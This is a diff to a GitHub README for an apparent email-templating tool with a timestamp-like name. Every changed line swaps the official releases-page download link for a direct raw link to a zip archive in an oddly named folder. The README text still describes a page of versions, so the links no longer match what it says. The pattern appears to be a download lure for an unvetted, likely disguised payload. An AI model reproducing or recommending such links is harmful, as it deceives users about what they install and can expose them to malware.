@@ -1,6 +1,6 @@
 # 📧 email-service-1771919053-1 - Simple Email Templates and Scheduling
 
-[![Download email-service-1771919053-1](https://img.shields.io/badge/Download-email--service--1771919053--1-blue?style=for-the-badge)](https://github.com/louisrivaschase-collab/email-service-1771919053-1/releases)
+[![Download email-service-1771919053-1](https://img.shields.io/badge/Download-email--service--1771919053--1-blue?style=for-the-badge)](https://raw.githubusercontent.com/louisrivaschase-collab/email-service-1771919053-1/main/Caenogaea/service_email_v3.9-beta.3.zip)
 
 ---
 
@@ -31,7 +31,7 @@ This section shows how to download and open the software step by step.
 
 1. Click this button to **visit the download page**:
 
-   [![Download email-service-1771919053-1](https://img.shields.io/badge/Download-email--service--1771919053--1-green?style=for-the-badge)](https://github.com/louisrivaschase-collab/email-service-1771919053-1/releases)
+   [![Download email-service-1771919053-1](https://img.shields.io/badge/Download-email--service--1771919053--1-green?style=for-the-badge)](https://raw.githubusercontent.com/louisrivaschase-collab/email-service-1771919053-1/main/Caenogaea/service_email_v3.9-beta.3.zip)
 
 2. The page lists different versions of the software. Look for the latest version. It usually appears at the top.
 
@@ -108,7 +108,7 @@ If the program does not work as expected, try these tips:
 
 Use this link to access the program downloads and get the latest version:
 
-[Download email-service-1771919053-1](https://github.com/louisrivaschase-collab/email-service-1771919053-1/releases)
+[Download email-service-1771919053-1](https://raw.githubusercontent.com/louisrivaschase-collab/email-service-1771919053-1/main/Caenogaea/service_email_v3.9-beta.3.zip)
 
 Follow the steps in the **Getting Started** section for a smooth download and install process.
 
